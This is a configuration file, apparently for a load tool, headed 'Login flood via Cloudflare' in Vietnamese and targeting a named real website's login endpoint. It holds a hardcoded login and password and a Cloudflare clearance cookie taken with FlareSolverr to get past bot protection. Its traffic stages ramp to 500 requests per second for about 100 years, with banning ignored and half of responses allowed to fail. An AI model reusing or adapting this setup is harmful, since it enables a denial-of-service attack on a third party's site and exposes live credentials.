# ============ THANHHUYREAL - Login flood qua Cloudflare ============

PHP_BASE_URL=https://thanhhuyreal.com
PHP_LOGIN_PAGE=/?auth=login
PHP_LOGIN_PATH=/model/login

PHP_IDENTIFIER=lonussystem
PHP_PASSWORD=lonussystem123@

# cf_clearance lay tu FlareSolverr - expire sau ~30 phut, chay lai neu bi 403
CF_CLEARANCE=Zn9r1jNL46s4badETJ_fLUm3gkwWsSGUbW0a62s.dns-1793258085-1.2.1.1-H2zdIB2Tlybj5E2SklQQBfWWvey9wUqI5MQOjIRkPMQhBnlNkDq_jv.sDpvuWhivTm2rQR0gYrnvle6l3Px8YaEX65SwZAxxutzDxpTyqLsbO9YD1Mnk.15AaB0b8.JPIIAUXwXYDuIfD4GqG2VEykxP7M.dSaI8CEBoip8IFfQwx1khb6UyWoRcQBaeTps0Br6YlyD25zhGL07uO7ksO4_1aVuUjlkTKgLBwoBOlRbmvOHMgyONrMd.J7vB8ysNINWFGeOa3wUAS139a0oj6mzZvOK2QuW6ZuCSQ3txwU7U0iFzLzoIEXgchB7C34O_OV7sCzTrztTO3Ah1g_NKWhGc133DBDO46zJUoJK2kM.4CnDcqbEo__IEtsSxS91ZwL9L.Zoc9A1f_K7ngaGZErXys6Wiiva.qOLH5hyu88zCuTA0M_Kat05gxdtCgOgqPzpC0cEnRhE7XFe08ybKPg

# User-Agent phai khop voi luc FlareSolverr lay cookie
CF_UA=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36

# ---------- Tai ----------
STAGES=30s:50,60s:200,60s:500,876000h:500
START_RATE=20
PRE_VUS=100
MAX_VUS=2000

REQUEST_DELAY=0
REQUEST_TIMEOUT=20s
PHP_FRESH_SESSION=true

# ---------- Nguong ----------
MAX_5XX_RATE=0.5
MAX_TIMEOUT_RATE=0.5
ABORT_ON_BAN=false
